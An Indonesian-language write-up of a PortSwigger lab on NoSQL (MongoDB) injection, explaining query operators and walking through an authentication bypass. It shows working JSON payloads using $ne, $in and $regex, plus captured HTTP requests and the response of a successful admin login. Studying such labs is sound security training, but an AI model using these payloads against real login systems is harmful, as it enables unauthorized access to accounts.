# NoSQL Injection Lab – Authentication Bypass

## Lab Description

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/ae988849-49c1-4d58-a786-6d008dc8fd0c)

---

## Overview

Database **NoSQL** seperti MongoDB menggunakan operator query untuk memfilter data. Contoh operator:

* `$where` – Memilih dokumen yang sesuai dengan ekspresi JavaScript.
* `$ne` – Memilih semua nilai yang tidak sama dengan nilai tertentu.
* `$in` – Memilih semua nilai yang terdapat dalam sebuah array.
* `$regex` – Memilih dokumen dengan nilai yang cocok dengan pola regex tertentu.

Pada aplikasi yang rentan, request login dikirim dalam format JSON:

```json
{"username":"wiener","password":"peter"}
```

Dengan memanfaatkan operator, payload dapat dimodifikasi. Contoh:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Query ini akan mengembalikan semua data user yang username dan password-nya tidak sama dengan "invalid", sehingga login dapat dilewati.

Untuk menargetkan akun tertentu, misalnya admin:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

---

## Solution

Ketika login menggunakan user wiener, request yang dikirim adalah:

```http
POST /login HTTP/1.1
Host: 0a2e004e0498675c8294e27d00550012.web-security-academy.net
Cookie: session=FidptxGNO2o5A1gT6hVGVo0ahawPmQaa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2e004e0498675c8294e27d00550012.web-security-academy.net/login
Content-Type: application/json
Content-Length: 40
Origin: https://0a2e004e0498675c8294e27d00550012.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"wiener","password":"peter"}
```

Jika menggunakan payload berikut:

```json
{"username":{"$in":"administrator"},"password":{"$ne":""}}
```

maka login gagal, karena username admin bukan `administrator` melainkan string acak seperti `admin@fra12`.

Untuk mengatasi hal ini, digunakan operator **regex** agar dapat menangkap semua username yang diawali dengan kata *admin*:

```json
{"username":{"$regex":"admin*"},"password":{"$ne":""}}
```

Payload di atas akan memilih semua user dengan username yang diawali *admin* dan password yang tidak kosong.

Hasil response menunjukkan bahwa admin memiliki username `adminsmto9bvx`:

```http
HTTP/2 302 Found
Location: /my-account?id=adminsmto9bvx
Set-Cookie: session=fGElqIm2RxpmcGKeA1faciz8HjHYRQ8G; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Ketika dibuka di browser, terlihat bahwa login berhasil sebagai admin.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/471abd07-405b-4a6f-b76e-9513a383329b)

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9c6bfc75-9c52-4764-b8ba-6ae626a50d97)
